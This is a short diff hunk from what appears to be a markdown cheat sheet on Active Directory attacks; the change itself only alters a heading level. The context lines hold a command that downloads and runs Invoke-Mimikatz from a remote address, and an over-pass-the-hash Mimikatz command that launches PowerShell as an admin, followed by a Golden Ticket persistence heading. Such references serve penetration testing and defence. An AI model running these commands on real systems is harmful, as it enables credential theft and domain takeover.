@@ -322,7 +322,8 @@ iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)
 # "Over pass the hash" generate tokens from hashes
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'
 ```
-## Persistence
+# Persistence
+
 ### Golden Ticket
 
 - **Invoke-Mimikatz:**
